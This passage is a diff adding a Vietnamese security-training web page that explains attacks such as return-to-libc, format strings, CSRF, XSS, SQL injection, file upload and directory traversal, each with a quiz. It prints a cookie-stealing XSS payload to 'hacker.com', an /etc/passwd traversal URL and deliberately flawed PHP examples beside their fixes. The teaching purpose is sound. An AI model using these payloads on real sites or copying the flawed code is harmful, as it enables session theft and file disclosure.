@@ -1,0 +1,588 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cẩm nang An toàn Thông tin (Tổng hợp 21 chủ đề)</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        html { scroll-behavior: smooth; }
+        .accordion-content { max-height: 0; overflow: hidden; transition: max-height 0.3s ease-out; visibility: hidden; opacity: 0; }
+        .accordion-content.open { max-height: 10000px; visibility: visible; opacity: 1; transition: max-height 0.8s ease-in, opacity 0.3s ease-in 0.1s; }
+        .quiz-option { transition: all 0.2s ease-in-out; }
+        .quiz-option.correct { background-color: #dcfce7; border-color: #22c55e; color: #166534; }
+        .quiz-option.incorrect { background-color: #fee2e2; border-color: #ef4444; color: #991b1b; opacity: 0.7; }
+        .quiz-option:disabled { cursor: not-allowed; }
+        pre { background-color: #1e293b; color: #e2e8f0; padding: 1rem; border-radius: 0.5rem; overflow-x: auto; font-family: 'Courier New', Courier, monospace; font-size: 0.9rem; margin-bottom: 1rem; }
+    </style>
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const accordionHeaders = document.querySelectorAll('.accordion-header');
+            accordionHeaders.forEach(header => {
+                header.addEventListener('click', () => {
+                    const content = header.nextElementSibling;
+                    const arrow = header.querySelector('.arrow');
+                    const isOpen = content.classList.contains('open');
+                    if (isOpen) { content.classList.remove('open'); if (arrow) arrow.style.transform = 'rotate(0deg)'; }
+                    else { content.classList.add('open'); if (arrow) arrow.style.transform = 'rotate(180deg)'; }
+                });
+            });
+
+            const mobileMenuBtn = document.getElementById('mobile-menu-btn');
+            const mobileMenu = document.getElementById('mobile-menu');
+            if (mobileMenuBtn && mobileMenu) mobileMenuBtn.addEventListener('click', () => mobileMenu.classList.toggle('hidden'));
+
+            const QUIZ_SESSION_LENGTH = 10;
+            let currentQuizPool = [];
+            let currentQuestionIndex = 0;
+            let score = 0;
+            let wrongTries = 0;
+            let currentTopicKey = '';
+            const quizDatabase = {};
+            const topicTitles = {};
+
+            function renderFromJson(json) {
+                const topics = (json && json.topics) ? json.topics : [];
+                topics.forEach(t => {
+                    quizDatabase[t.id] = t.quiz || [];
+                    topicTitles[t.id] = t.title || t.id;
+                });
+            }
+
+            async function tryFetchUrls(urls) {
+                for (const u of urls) {
+                    try {
+                        const r = await fetch(encodeURI(u));
+                        const json = await r.json();
+                        renderFromJson(json);
+                        return true;
+                    } catch (e) {}
+                }
+                return false;
+            }
+
+            tryFetchUrls(['./Handbook_Data_ATTT.json', 'https://hethongthongminh.id.vn/data/Handbook_Data_ATTT.json']).then(ok => {
+                if (!ok) {
+                    const fb = document.getElementById('json-fallback');
+                    if (fb) fb.classList.remove('hidden');
+                }
+            });
+
+            const modal = document.getElementById('quiz-modal');
+            const questionText = document.getElementById('question-text');
+            const answerOptions = document.getElementById('answer-options');
+            const feedbackArea = document.getElementById('feedback-area');
+            const nextBtn = document.getElementById('next-question-btn');
+            const scoreDisplay = document.getElementById('score-display');
+            const questionCounter = document.getElementById('question-counter');
+            const quizContent = document.getElementById('quiz-content');
+            const quizResults = document.getElementById('quiz-results');
+            const finalScore = document.getElementById('final-score');
+
+            function shuffle(array) { return array.sort(() => Math.random() - 0.5); }
+
+            function buildQuizPool(list) {
+                const arr = shuffle([...list]);
+                if (arr.length >= QUIZ_SESSION_LENGTH) return arr.slice(0, QUIZ_SESSION_LENGTH);
+                const pool = [...arr];
+                if (arr.length > 0) {
+                    while (pool.length < QUIZ_SESSION_LENGTH) pool.push(arr[Math.floor(Math.random() * arr.length)]);
+                }
+                return pool;
+            }
+
+            document.querySelectorAll('.start-quiz-btn').forEach(btn => {
+                btn.addEventListener('click', (e) => {
+                    const topic = e.currentTarget.dataset.topic;
+                    const allQuestions = quizDatabase[topic];
+                    if (!allQuestions || allQuestions.length === 0) { alert('Dữ liệu đang được cập nhật!'); return; }
+                    currentTopicKey = topic; score = 0; currentQuestionIndex = 0;
+                    currentQuizPool = buildQuizPool(allQuestions);
+                    const t = document.getElementById('quiz-title');
+                    if (t) t.innerText = `Luyện tập ${topicTitles[topic] || ''}`;
+                    updateUI(); if (modal) modal.classList.remove('hidden'); showResults(false); loadQuestion();
+                });
+            });
+
+            function loadQuestion() {
+                const q = currentQuizPool[currentQuestionIndex];
+                if (!q) return;
+                questionText.innerText = q.q;
+                questionCounter.innerText = `${currentQuestionIndex + 1} / ${currentQuizPool.length}`;
+                feedbackArea.classList.add('hidden'); nextBtn.classList.add('hidden'); wrongTries = 0;
+                const correctOpts = q.options.filter(o => o.correct);
+                const incorrectOpts = q.options.filter(o => !o.correct);
+                const chosenCorrect = shuffle(correctOpts)[0];
+                const chosenIncorrect = shuffle(incorrectOpts).slice(0, 3);
+                const displayOpts = shuffle([chosenCorrect, ...chosenIncorrect]);
+                answerOptions.innerHTML = '';
+                displayOpts.forEach(opt => {
+                    const btn = document.createElement('button');
+                    btn.className = 'quiz-option w-full text-left p-4 rounded-lg border-2 border-slate-200 hover:border-indigo-400 hover:bg-indigo-50 font-medium text-slate-700 transition-all';
+                    btn.innerText = opt.text;
+                    btn.onclick = () => handleAnswer(btn, opt.correct, q.explanation, chosenCorrect.text);
+                    answerOptions.appendChild(btn);
+                });
+            }
+
+            function handleAnswer(btn, isCorrect, explanation, correctText) {
+                const allBtns = answerOptions.querySelectorAll('button');
+                if (isCorrect) {
+                    btn.classList.add('correct', 'border-green-500', 'bg-green-50', 'text-green-800');
+                    if (wrongTries === 0) score += 1;
+                    showFeedback(true, explanation);
+                    allBtns.forEach(b => b.disabled = true);
+                    nextBtn.classList.remove('hidden');
+                    updateUI();
+                } else {
+                    btn.classList.add('incorrect', 'border-red-300', 'bg-red-50');
+                    btn.disabled = true; score -= 0.5; wrongTries++; updateUI();
+                    if (wrongTries >= 3) {
+                        showFeedback(false, `Đáp án đúng: "${correctText}". <br><br>${explanation}`);
+                        allBtns.forEach(b => { b.disabled = true; if (b.innerText === correctText) b.classList.add('correct', 'border-green-500'); });
+                        nextBtn.classList.remove('hidden');
+                    }
+                }
+            }
+
+            function showFeedback(success, text) {
+                feedbackArea.classList.remove('hidden');
+                feedbackArea.className = `mt-6 p-4 rounded-lg text-sm border ${success ? 'bg-green-50 border-green-200 text-green-800' : 'bg-red-50 border-red-200 text-red-800'} animate-fade-in`;
+                feedbackArea.innerHTML = `<strong>${success ? 'Chính xác!' : 'Sai quá 3 lần!'}</strong> ${text}`;
+            }
+
+            function updateUI() { scoreDisplay.innerText = score; scoreDisplay.className = score < 0 ? 'text-lg font-bold text-red-600' : 'text-lg font-bold text-green-600'; }
+            if (nextBtn) nextBtn.onclick = () => { currentQuestionIndex++; if (currentQuestionIndex < currentQuizPool.length) loadQuestion(); else finishQuiz(); };
+            function finishQuiz() { showResults(true); finalScore.innerText = score; }
+            function showResults(show) { if (show) { quizContent.classList.add('hidden'); quizResults.classList.remove('hidden'); nextBtn.classList.add('hidden'); } else { quizContent.classList.remove('hidden'); quizResults.classList.add('hidden'); } }
+            const closeBtn = document.getElementById('close-quiz-btn');
+            if (closeBtn) closeBtn.onclick = () => modal.classList.add('hidden');
+            const restartBtn = document.getElementById('restart-quiz-btn');
+            if (restartBtn) restartBtn.onclick = () => {
+                const trigger = document.querySelector(`button[data-topic="${currentTopicKey}"]`);
+                if (trigger) trigger.click();
+            };
+
+            const fileInput = document.getElementById('json-file-input');
+            if (fileInput) fileInput.addEventListener('change', (e) => {
+                const file = e.target.files && e.target.files[0];
+                if (!file) return;
+                const reader = new FileReader();
+                reader.onload = () => {
+                    try {
+                        const json = JSON.parse(reader.result);
+                        renderFromJson(json);
+                        const fb = document.getElementById('json-fallback');
+                        if (fb) fb.classList.add('hidden');
+                    } catch {
+                        alert('Tệp JSON không hợp lệ');
+                    }
+                };
+                reader.readAsText(file);
+            });
+        });
+    </script>
+</head>
+<body class="bg-slate-100 text-slate-800 font-sans leading-relaxed">
+    <nav class="bg-indigo-900 text-white shadow-lg sticky top-0 z-50 border-b border-indigo-800">
+        <div class="container mx-auto max-w-6xl px-4 sm:px-6 lg:px-8">
+            <div class="flex justify-between items-center h-16">
+                <div class="flex-shrink-0 flex items-center gap-2">
+                    <span class="text-2xl">🛡️</span>
+                    <h1 class="text-xl sm:text-2xl font-bold tracking-tight">INSE Handbook <span class="text-green-400 text-sm font-normal">Tổng hợp</span></h1>
+                </div>
+                <div class="hidden md:block">
+                    <div class="ml-10 flex items-baseline space-x-4">
+                        <a href="#section-1" class="px-3 py-2 rounded-md text-sm font-medium hover:bg-indigo-700 transition-colors">Tấn công & Lỗ hổng</a>
+                        <a href="#section-2" class="px-3 py-2 rounded-md text-sm font-medium hover:bg-indigo-700 transition-colors">Mật mã học</a>
+                        <a href="#section-3" class="px-3 py-2 rounded-md text-sm font-medium hover:bg-indigo-700 transition-colors">Hạ tầng & Giao thức</a>
+                    </div>
+                </div>
+                <div class="md:hidden">
+                    <button id="mobile-menu-btn" class="text-indigo-200 hover:text-white focus:outline-none">
+                        <svg class="h-8 w-8" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16" /></svg>
+                    </button>
+                </div>
+            </div>
+        </div>
+        <div id="mobile-menu" class="md:hidden hidden bg-indigo-900">
+            <div class="px-2 pt-2 pb-3 space-y-1 sm:px-3">
+                <a href="#section-1" class="block px-3 py-2 rounded-md text-base font-medium hover:bg-indigo-700">Phần 1</a>
+                <a href="#section-2" class="block px-3 py-2 rounded-md text-base font-medium hover:bg-indigo-700">Phần 2</a>
+                <a href="#section-3" class="block px-3 py-2 rounded-md text-base font-medium hover:bg-indigo-700">Phần 3</a>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container mx-auto max-w-5xl p-4 sm:p-6 lg:p-8">
+        <div class="bg-white rounded-xl shadow-md p-6 sm:p-8 mb-10 border-l-4 border-green-500">
+            <h2 class="text-2xl font-bold text-indigo-900 mb-3">Bản Tổng Hợp 21 Chủ đề</h2>
+            <p class="text-slate-600">Hợp nhất nội dung từ các phiên bản v2–v8: mỗi phiên bản mở rộng 3 chủ đề. Tài liệu này gom đủ 21 chủ đề với bố cục Accordion và phần luyện tập.</p>
+        </div>
+
+        <section id="section-1" class="mb-16">
+            <div class="flex items-center mb-6 border-b-2 border-indigo-200 pb-2">
+                <span class="text-4xl mr-3">⚔️</span>
+                <h2 class="text-3xl font-bold text-slate-800">Phần 1: Tấn công, Lỗ hổng & Công cụ</h2>
+            </div>
+            <div class="space-y-4">
+                <div class="accordion-item bg-white rounded-xl shadow border border-slate-200 overflow-hidden group">
+                    <button class="accordion-header w-full text-left p-6 text-xl font-bold text-indigo-900 hover:bg-indigo-50 transition-all duration-200 flex justify-between items-center">
+                        <span>1. Return-to-libc Attack <span class="ml-2 text-xs bg-red-100 text-red-800 px-2 py-1 rounded border border-red-200">Nâng cao</span></span>
+                        <span class="arrow text-indigo-300 transform transition-transform duration-300 text-2xl">&#9662;</span>
+                    </button>
+                    <div class="accordion-content bg-slate-50">
+                        <div class="p-6 sm:p-8 border-t border-slate-200">
+                            <div class="grid grid-cols-1 lg:grid-cols-3 gap-8 mb-8">
+                                <div class="lg:col-span-2 space-y-6">
+                                    <div>
+                                        <h3 class="text-lg font-bold text-indigo-700 mb-2 flex items-center"><span class="bg-indigo-600 text-white w-6 h-6 rounded-full inline-flex items-center justify-center text-sm mr-2">1</span> Bản chất vấn đề</h3>
+                                        <p class="text-slate-700 text-justify">Trong các cuộc tấn công Buffer Overflow cổ điển, kẻ tấn công chèn mã độc vào Stack và ghi đè địa chỉ trả về để nhảy tới Stack. Các hệ điều hành hiện đại dùng NX Bit/DEP đánh dấu Stack không thực thi.</p>
+                                    </div>
+                                    <div>
+                                        <h3 class="text-lg font-bold text-indigo-700 mb-2 flex items-center"><span class="bg-indigo-600 text-white w-6 h-6 rounded-full inline-flex items-center justify-center text-sm mr-2">2</span> Cơ chế Return-to-libc</h3>
+                                        <p class="text-slate-700 text-justify mb-3">Bypass NX Bit bằng cách tái sử dụng các hàm có sẵn trong libc (như system()).</p>
+                                        <div class="bg-white p-4 rounded border border-slate-300 shadow-sm">
+                                            <p class="font-semibold text-sm text-slate-500 uppercase mb-2">Cấu trúc Stack bị thao túng:</p>
+                                            <ul class="space-y-2 text-sm font-mono">
+                                                <li class="bg-red-50 p-2 rounded border-l-4 border-red-400">1. Buffer Padding</li>
+                                                <li class="bg-indigo-50 p-2 rounded border-l-4 border-indigo-500 font-bold">2. Địa chỉ system()</li>
+                                                <li class="bg-yellow-50 p-2 rounded border-l-4 border-yellow-400">3. Địa chỉ exit()</li>
+                                                <li class="bg-green-50 p-2 rounded border-l-4 border-green-500 font-bold">4. Địa chỉ chuỗi "/bin/sh"</li>
+                                            </ul>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="space-y-6">
+                                    <div class="bg-white p-5 rounded-lg border border-slate-200 shadow-sm">
+                                        <h4 class="font-bold text-slate-800 mb-3 border-b pb-2">Mục tiêu tấn công</h4>
+                                        <ul class="space-y-3 text-sm text-slate-600">
+                                            <li class="flex items-start"><span class="text-green-500 mr-2">✓</span> Chiếm quyền điều khiển luồng thực thi.</li>
+                                            <li class="flex items-start"><span class="text-green-500 mr-2">✓</span> Gọi system("/bin/sh").</li>
+                                            <li class="flex items-start"><span class="text-green-500 mr-2">✓</span> Vượt NX/DEP.</li>
+                                        </ul>
+                                    </div>
+                                    <div class="bg-blue-50 p-5 rounded-lg border border-blue-100">
+                                        <h4 class="font-bold text-blue-800 mb-3">Phòng chống</h4>
+                                        <div class="space-y-3">
+                                            <div><p class="font-bold text-sm text-blue-900">ASLR</p><p class="text-xs text-blue-700">Ngẫu nhiên hóa vị trí libc.</p></div>
+                                            <div><p class="font-bold text-sm text-blue-900">Stack Canaries</p><p class="text-xs text-blue-700">Phát hiện tràn bộ đệm.</p></div>
+                                            <div><p class="font-bold text-sm text-blue-900">ASCII Armoring</p><p class="text-xs text-blue-700">Làm địa chỉ chứa 0x00.</p></div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="text-center mt-6 pt-6 border-t border-slate-200">
+                                <button data-topic="topic-1" class="start-quiz-btn bg-gradient-to-r from-indigo-600 to-purple-600 text-white font-bold py-3 px-8 rounded-full shadow-lg">Luyện tập Chủ đề 1</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="accordion-item bg-white rounded-xl shadow border border-slate-200 overflow-hidden group">
+                    <button class="accordion-header w-full text-left p-6 text-xl font-bold text-indigo-900 hover:bg-indigo-50 transition-all duration-200 flex justify-between items-center">
+                        <span>2. Format String Attack <span class="ml-2 text-xs bg-yellow-100 text-yellow-800 px-2 py-1 rounded border border-yellow-200">Nguy hiểm</span></span>
+                        <span class="arrow text-indigo-300 transform transition-transform duration-300 text-2xl">&#9662;</span>
+                    </button>
+                    <div class="accordion-content bg-slate-50">
+                        <div class="p-6 sm:p-8 border-t border-slate-200">
+                            <div class="space-y-6 mb-8">
+                                <div>
+                                    <h3 class="text-lg font-bold text-indigo-700 mb-2">Nguyên nhân gốc rễ</h3>
+                                    <p class="text-slate-700 mb-4">Lỗ hổng khi dùng họ printf với input không kiểm soát.</p>
+                                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                                        <div class="bg-red-50 border border-red-200 p-3 rounded"><p class="text-red-700 font-mono text-sm font-bold">Code Sai:</p><code class="block mt-1 text-red-900">printf(user_input);</code></div>
+                                        <div class="bg-green-50 border border-green-200 p-3 rounded"><p class="text-green-700 font-mono text-sm font-bold">Code Đúng:</p><code class="block mt-1 text-green-900">printf("%s", user_input);</code></div>
+                                    </div>
+                                </div>
+                                <div>
+                                    <h3 class="text-lg font-bold text-indigo-700 mb-3">Specifier nguy hiểm</h3>
+                                    <div class="overflow-x-auto">
+                                        <table class="min-w-full bg-white border border-slate-200 text-sm">
+                                            <thead><tr class="bg-slate-100 text-slate-700"><th class="py-2 px-4 border-b text-left">Specifier</th><th class="py-2 px-4 border-b text-left">Chức năng</th><th class="py-2 px-4 border-b text-left">Khai thác</th></tr></thead>
+                                            <tbody>
+                                                <tr><td class="py-2 px-4 border-b font-mono font-bold text-indigo-600">%x</td><td class="py-2 px-4 border-b">In Hex</td><td class="py-2 px-4 border-b">Đọc giá trị từ Stack.</td></tr>
+                                                <tr><td class="py-2 px-4 border-b font-mono font-bold text-indigo-600">%s</td><td class="py-2 px-4 border-b">In chuỗi</td><td class="py-2 px-4 border-b">Đọc dữ liệu tại địa chỉ bất kỳ.</td></tr>
+                                                <tr class="bg-red-50"><td class="py-2 px-4 border-b font-mono font-bold text-red-600">%n</td><td class="py-2 px-4 border-b">Ghi số byte đã in</td><td class="py-2 px-4 border-b font-bold text-red-700">Ghi dữ liệu vào bộ nhớ.</td></tr>
+                                            </tbody>
+                                        </table>
+                                    </div>
+                                </div>
+                                <div>
+                                    <h3 class="text-lg font-bold text-indigo-700 mb-2">Kịch bản: Ghi đè GOT</h3>
+                                    <p class="text-slate-700 text-justify">Ghi đè printf trong GOT thành system để gọi shell.</p>
+                                </div>
+                            </div>
+                            <div class="text-center mt-6 pt-6 border-t border-slate-200"><button data-topic="topic-2" class="start-quiz-btn bg-gradient-to-r from-indigo-600 to-purple-600 text-white font-bold py-3 px-8 rounded-full shadow-lg">Luyện tập Chủ đề 2</button></div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="accordion-item bg-white rounded-xl shadow border border-slate-200 overflow-hidden group">
+                    <button class="accordion-header w-full text-left p-6 text-xl font-bold text-indigo-900 hover:bg-indigo-50 transition-all duration-200 flex justify-between items-center">
+                        <span>3. CSRF (Cross-Site Request Forgery) <span class="ml-2 text-xs bg-blue-100 text-blue-800 px-2 py-1 rounded border border-blue-200">Phổ biến</span></span>
+                        <span class="arrow text-indigo-300 transform transition-transform duration-300 text-2xl">&#9662;</span>
+                    </button>
+                    <div class="accordion-content bg-slate-50">
+                        <div class="p-6 sm:p-8 border-t border-slate-200">
+                            <div class="grid grid-cols-1 lg:grid-cols-2 gap-8 mb-8">
+                                <div>
+                                    <h3 class="text-lg font-bold text-indigo-700 mb-3">Mô hình tấn công</h3>
+                                    <div class="bg-white p-4 rounded-lg border border-slate-200 shadow-sm">
+                                        <ol class="list-decimal list-inside space-y-3 text-slate-700 text-sm">
+                                            <li>Điều kiện: Nạn nhân đã đăng nhập.</li>
+                                            <li>Cạm bẫy: Truy cập trang độc hại.</li>
+                                            <li>Thực thi ngầm qua thẻ img gửi request.</li>
+                                            <li>Trình duyệt tự gửi Cookie -> Server tin tưởng.</li>
+                                        </ol>
+                                    </div>
+                                </div>
+                                <div>
+                                    <h3 class="text-lg font-bold text-indigo-700 mb-3">Tại sao nguy hiểm?</h3>
+                                    <p class="text-slate-700 mb-4 text-justify">Lợi dụng niềm tin của Server vào trình duyệt.</p>
+                                    <div class="bg-yellow-50 p-4 rounded-lg border border-yellow-200"><p class="font-bold text-yellow-800 text-sm">CSRF vs XSS</p><ul class="list-disc list-inside text-xs text-yellow-900 mt-1"><li>XSS: Ăn cắp Cookie/Token.</li><li>CSRF: Ép người dùng thực hiện hành động.</li></ul></div>
+                                </div>
+                            </div>
+                            <div class="bg-indigo-50 p-6 rounded-lg border border-indigo-100">
+                                <h3 class="text-lg font-bold text-indigo-800 mb-4">Phòng thủ đa lớp</h3>
+                                <div class="grid grid-cols-1 md:grid-cols-3 gap-6"><div><h4 class="font-bold text-indigo-700 mb-2">Anti-CSRF Token</h4><p class="text-sm text-slate-600">Kiểm tra token.</p></div><div><h4 class="font-bold text-indigo-700 mb-2">SameSite Cookie</h4><p class="text-sm text-slate-600">Chặn cross-site.</p></div><div><h4 class="font-bold text-indigo-700 mb-2">Xác thực lại</h4><p class="text-sm text-slate-600">Nhập lại mã nhạy cảm.</p></div></div>
+                            </div>
+                            <div class="text-center mt-6 pt-6 border-t border-slate-200"><button data-topic="topic-3" class="start-quiz-btn bg-gradient-to-r from-indigo-600 to-purple-600 text-white font-bold py-3 px-8 rounded-full shadow-lg">Luyện tập Chủ đề 3</button></div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="accordion-item bg-white rounded-xl shadow border border-slate-200 overflow-hidden group border-l-4 border-l-purple-500">
+                    <button class="accordion-header w-full text-left p-6 text-xl font-bold text-indigo-900 hover:bg-indigo-50 transition-all duration-200 flex justify-between items-center">
+                        <span>4. XSS (Cross-Site Scripting) <span class="ml-2 text-xs bg-purple-100 text-purple-800 px-2 py-1 rounded border border-purple-200">Chi tiết</span></span>
+                        <span class="arrow text-indigo-300 transform transition-transform duration-300 text-2xl">&#9662;</span>
+                    </button>
+                    <div class="accordion-content bg-slate-50">
+                        <div class="p-6 sm:p-8 border-t border-slate-200">
+                            <div class="grid grid-cols-1 lg:grid-cols-3 gap-8 mb-8">
+                                <div class="lg:col-span-2">
+                                    <h3 class="text-lg font-bold text-indigo-700 mb-3">Cơ chế hoạt động</h3>
+                                    <p class="text-slate-700 mb-4 text-justify">Ứng dụng chèn dữ liệu không tin cậy lên trang mà không encode phù hợp, cho phép thực thi JavaScript độc hại.</p>
+                                    <h4 class="font-bold text-slate-800 mb-2">Ba biến thể</h4>
+                                    <div class="space-y-3">
+                                        <div class="bg-white p-3 rounded border border-slate-200 shadow-sm"><span class="text-red-600 font-bold">Stored XSS:</span><p class="text-sm text-slate-600 mt-1">Mã độc lưu trong CSDL.</p></div>
+                                        <div class="bg-white p-3 rounded border border-slate-200 shadow-sm"><span class="text-orange-600 font-bold">Reflected XSS:</span><p class="text-sm text-slate-600 mt-1">Mã độc nằm trong URL.</p></div>
+                                        <div class="bg-white p-3 rounded border border-slate-200 shadow-sm"><span class="text-blue-600 font-bold">DOM-based XSS:</span><p class="text-sm text-slate-600 mt-1">Lỗi hoàn toàn ở client-side.</p></div>
+                                    </div>
+                                </div>
+                                <div class="space-y-4">
+                                    <div class="bg-slate-800 p-4 rounded-lg text-slate-200 font-mono text-sm overflow-x-auto"><p class="text-slate-400 mb-2">Payload cơ bản</p><code class="text-red-400">&lt;script&gt;alert(1)&lt;/script&gt;</code><p class="text-slate-400 mt-3 mb-2">Payload đánh cắp Cookie</p><code class="text-yellow-400">&lt;script&gt;fetch('http://hacker.com?c='+document.cookie)&lt;/script&gt;</code></div>
+                                </div>
+                            </div>
+                            <div class="text-center pt-4"><button data-topic="topic-4" class="start-quiz-btn bg-gradient-to-r from-purple-600 to-indigo-600 text-white font-bold py-3 px-8 rounded-full shadow-lg">Luyện tập XSS</button></div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="accordion-item bg-white rounded-xl shadow border border-slate-200 overflow-hidden group border-l-4 border-l-red-500">
+                    <button class="accordion-header w-full text-left p-6 text-xl font-bold text-indigo-900 hover:bg-indigo-50 transition-all duration-200 flex justify-between items-center">
+                        <span>5. SQL Injection (SQLi) <span class="ml-2 text-xs bg-red-100 text-red-800 px-2 py-1 rounded border border-red-200">Chi tiết</span></span>
+                        <span class="arrow text-indigo-300 transform transition-transform duration-300 text-2xl">&#9662;</span>
+                    </button>
+                    <div class="accordion-content bg-slate-50">
+                        <div class="p-6 sm:p-8 border-t border-slate-200">
+                            <div class="mb-6">
+                                <h3 class="text-lg font-bold text-indigo-700 mb-2">Cơ chế & Ví dụ</h3>
+                                <p class="text-slate-700 mb-4">Ghép chuỗi trực tiếp input vào câu lệnh SQL làm thay đổi logic.</p>
+                                <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                                    <div class="bg-red-50 border border-red-200 p-4 rounded-lg"><h4 class="font-bold text-red-700 text-sm mb-2">Mã nguồn lỗi (PHP)</h4><pre class="text-xs text-red-900 bg-red-100 p-3 rounded overflow-x-auto">$sql = "SELECT * FROM users WHERE id = " . $id;</pre></div>
+                                    <div class="bg-green-50 border border-green-200 p-4 rounded-lg"><h4 class="font-bold text-green-700 text-sm mb-2">Mã nguồn an toàn (PDO)</h4><pre class="text-xs text-green-900 bg-green-100 p-3 rounded overflow-x-auto">$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");</pre></div>
+                                </div>
+                            </div>
+                            <div class="text-center pt-4 border-t border-slate-200"><button data-topic="topic-5" class="start-quiz-btn bg-gradient-to-r from-red-600 to-orange-600 text-white font-bold py-3 px-8 rounded-full shadow-lg">Luyện tập SQL Injection</button></div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="accordion-item bg-white rounded-xl shadow border border-slate-200 overflow-hidden group border-l-4 border-l-slate-600">
+                    <button class="accordion-header w-full text-left p-6 text-xl font-bold text-indigo-900 hover:bg-indigo-50 transition-all duration-200 flex justify-between items-center">
+                        <span>6. Sqlmap (Công cụ tự động) <span class="ml-2 text-xs bg-slate-200 text-slate-800 px-2 py-1 rounded border border-slate-300">Chi tiết</span></span>
+                        <span class="arrow text-indigo-300 transform transition-transform duration-300 text-2xl">&#9662;</span>
+                    </button>
+                    <div class="accordion-content bg-slate-50">
+                        <div class="p-6 sm:p-8 border-t border-slate-200">
+                            <div class="flex flex-col md:flex-row gap-8 mb-6">
+                                <div class="md:w-1/2"><h3 class="text-lg font-bold text-indigo-700 mb-3">Sqlmap là gì?</h3><p class="text-slate-700 text-justify mb-4">Công cụ mã nguồn mở tự động phát hiện/khai thác SQLi.</p></div>
+                                <div class="md:w-1/2"><h3 class="text-lg font-bold text-indigo-700 mb-3">Quy trình tấn công</h3><ol class="list-decimal list-inside text-sm text-slate-700 space-y-2"><li class="pl-2">Identification</li><li class="pl-2">Enumeration</li><li class="pl-2">Extraction</li><li class="pl-2">Takeover</li></ol></div>
+                            </div>
+                            <div class="text-center pt-6"><button data-topic="topic-6" class="start-quiz-btn bg-gradient-to-r from-slate-600 to-slate-800 text-white font-bold py-3 px-8 rounded-full shadow-lg">Luyện tập Sqlmap</button></div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="accordion-item bg-white rounded-xl shadow border border-slate-200 overflow-hidden group border-l-4 border-l-orange-500">
+                    <button class="accordion-header w-full text-left p-6 text-xl font-bold text-indigo-900 hover:bg-indigo-50 transition-all duration-200 flex justify-between items-center">
+                        <span>7. File Upload Vulnerability <span class="ml-2 text-xs bg-orange-100 text-orange-800 px-2 py-1 rounded border border-orange-200">V4</span></span>
+                        <span class="arrow text-indigo-300 transform transition-transform duration-300 text-2xl">&#9662;</span>
+                    </button>
+                    <div class="accordion-content bg-slate-50">
+                        <div class="p-6 sm:p-8 border-t border-slate-200">
+                            <div class="grid grid-cols-1 lg:grid-cols-2 gap-8 mb-8">
+                                <div><h3 class="text-lg font-bold text-indigo-700 mb-3">Cơ chế lỗ hổng</h3><p class="text-slate-700 text-justify mb-4">Cho phép upload mà không kiểm tra đúng loại/kích thước/nội dung, kẻ tấn công tải Web Shell.</p><div class="bg-red-50 p-4 rounded border border-red-200"><h4 class="font-bold text-red-800 text-sm">Nguy cơ chính: RCE</h4><p class="text-xs text-red-700 mt-1">Nếu shell.php được thực thi, hacker có quyền tương đương web server.</p></div></div>
+                                <div><h3 class="text-lg font-bold text-indigo-700 mb-3">Ví dụ Mã nguồn</h3><div class="mb-4"><span class="text-xs font-bold text-red-600 uppercase">Code Lỗi</span><pre class="bg-slate-800 text-red-300 p-3 rounded text-xs overflow-x-auto mt-1">$file_name = $_FILES['file']['name'];
+$ext = pathinfo($file_name, PATHINFO_EXTENSION);
+if ($ext == "php") { die("Error!"); }
+move_uploaded_file($_FILES['file']['tmp_name'], "uploads/".$file_name);</pre></div><div><span class="text-xs font-bold text-green-600 uppercase">Code An toàn</span><pre class="bg-slate-800 text-green-300 p-3 rounded text-xs overflow-x-auto mt-1">$allowed = ['jpg', 'png', 'gif'];
+$ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));
+if (!in_array($ext, $allowed)) { die("Invalid type"); }
+$new_name = md5(uniqid()) . "." . $ext; 
+move_uploaded_file($tmp, "uploads/" . $new_name);</pre></div></div>
+                            </div>
+                            <div class="bg-indigo-50 p-5 rounded-lg border border-indigo-100"><h3 class="font-bold text-indigo-800 mb-2">Phòng thủ</h3><ul class="list-disc list-inside text-sm text-slate-700 space-y-1"><li>Whitelist Extension</li><li>Validate Content</li><li>Randomize Filename</li><li>Store Outside Webroot</li><li>Disable Execution</li></ul></div>
+                            <div class="text-center pt-6"><button data-topic="topic-7" class="start-quiz-btn bg-gradient-to-r from-orange-500 to-red-500 text-white font-bold py-3 px-8 rounded-full shadow-lg">Luyện tập File Upload</button></div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="accordion-item bg-white rounded-xl shadow border border-slate-200 overflow-hidden group border-l-4 border-l-yellow-500">
+                    <button class="accordion-header w-full text-left p-6 text-xl font-bold text-indigo-900 hover:bg-indigo-50 transition-all duration-200 flex justify-between items-center">
+                        <span>8. Directory Traversal <span class="ml-2 text-xs bg-yellow-100 text-yellow-800 px-2 py-1 rounded border border-yellow-200">V4</span></span>
+                        <span class="arrow text-indigo-300 transform transition-transform duration-300 text-2xl">&#9662;</span>
+                    </button>
+                    <div class="accordion-content bg-slate-50">
+                        <div class="p-6 sm:p-8 border-t border-slate-200">
+                            <div class="grid grid-cols-1 lg:grid-cols-2 gap-8 mb-8">
+                                <div><h3 class="text-lg font-bold text-indigo-700 mb-3">Khái niệm & Cơ chế</h3><p class="text-slate-700 text-justify mb-4">Cho phép truy cập file ngoài web root bằng ../</p><div class="bg-white p-4 shadow-sm border border-slate-200 rounded"><p class="font-mono text-sm text-slate-600">URL bình thường:</p><code class="text-green-600 text-sm">view.php?file=image.jpg</code><p class="font-mono text-sm text-slate-600 mt-2">URL tấn công:</p><code class="text-red-600 text-sm">view.php?file=../../../../etc/passwd</code></div></div>
